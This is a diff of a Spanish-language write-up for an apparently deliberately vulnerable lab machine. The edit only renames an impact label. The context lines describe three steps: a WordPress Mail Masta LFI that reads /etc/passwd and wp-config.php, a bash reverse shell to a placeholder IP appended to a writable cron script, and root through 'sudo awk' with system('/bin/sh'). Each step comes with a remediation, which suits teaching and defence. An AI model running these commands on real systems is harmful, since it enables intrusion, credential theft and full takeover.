@@ -96,7 +96,7 @@ El auditor deberá identificar la vulnerabilidad LFI para extraer las credencial
 
 - Cómo puede explotarse: Mediante el envío de una petición HTTP manipulada que utilice secuencias de salto de directorio (../../../../etc/passwd) a través del parámetro vulnerable del plugin para forzar al servidor a renderizar el contenido de archivos locales del sistema de archivos, tales como /etc/passwd o wp-config.php.
 
-- Impacto tiene: Crítico. Fuga de información confidencial y exposición de las credenciales de texto plano de la base de datos de WordPress, las cuales se reutilizan en el servicio SSH.
+- Impacto: Crítico. Fuga de información confidencial y exposición de las credenciales de texto plano de la base de datos de WordPress, las cuales se reutilizan en el servicio SSH.
 
 - Cómo se corregiría en un sistema real: Desinstalar de inmediato el plugin Mail Masta o actualizarlo a una versión parcheada que sanitice las entradas del usuario. Implementar directivas estrictas en la configuración de PHP (allow_url_fopen = Off y allow_url_include = Off).
 
@@ -110,7 +110,7 @@ El auditor deberá identificar la vulnerabilidad LFI para extraer las credencial
 
 - Cómo puede explotarse: El usuario inicial haber_fritz concatena una línea de comandos al final del archivo aprovechando su permiso de escritura (echo "bash -i >& /dev/tcp/IP/PUERTO 0>&1" >> /opt/scripts/backup_notes.sh). Al cumplirse el minuto, el demonio Cron procesa el archivo e inicia una conexión inversa automatizada.
 
-- Impacto tiene: Alto. Suplantación y toma de control horizontal de la identidad de la usuaria intermedia clara_immerwahr, obteniendo acceso directo a sus documentos e historial.
+- Impacto: Alto. Suplantación y toma de control horizontal de la identidad de la usuaria intermedia clara_immerwahr, obteniendo acceso directo a sus documentos e historial.
 
 - Cómo se corregiría en un sistema real: Aplicar el principio de mínimo privilegio sobre el archivo de mantenimiento, eliminando el permiso de escritura para el resto de usuarios del sistema mediante el comando chmod 755 /opt/scripts/backup_notes.sh o asignando la propiedad estricta a su ejecutor legítimo.
 
@@ -124,7 +124,7 @@ El auditor deberá identificar la vulnerabilidad LFI para extraer las credencial
 
 - Cómo puede explotarse: Una vez que el auditor se encuentra en la sesión de Clara, invoca el binario abusando de la propiedad de ejecución de comandos interactivos (GTFOBins) mediante la sentencia: sudo awk 'BEGIN {system("/bin/sh")}'.
 
-- Impacto tiene: Crítico. Compromiso total y absoluto del servidor virtual. El auditor obtiene acceso directo como el superusuario root, logrando persistencia, lectura y modificación de cualquier recurso del sistema operativo.
+- Impacto: Crítico. Compromiso total y absoluto del servidor virtual. El auditor obtiene acceso directo como el superusuario root, logrando persistencia, lectura y modificación de cualquier recurso del sistema operativo.
 
 - Cómo se corregiría en un sistema real: Revocar la directiva NOPASSWD para comandos que dispongan de funciones de escape integradas. Si es estrictamente necesario delegar la tarea a awk, estructurar scripts específicos firmados o restringir sus argumentos mediante alias de comandos específicos en /etc/sudoers para evitar la inyección de la función system().
 
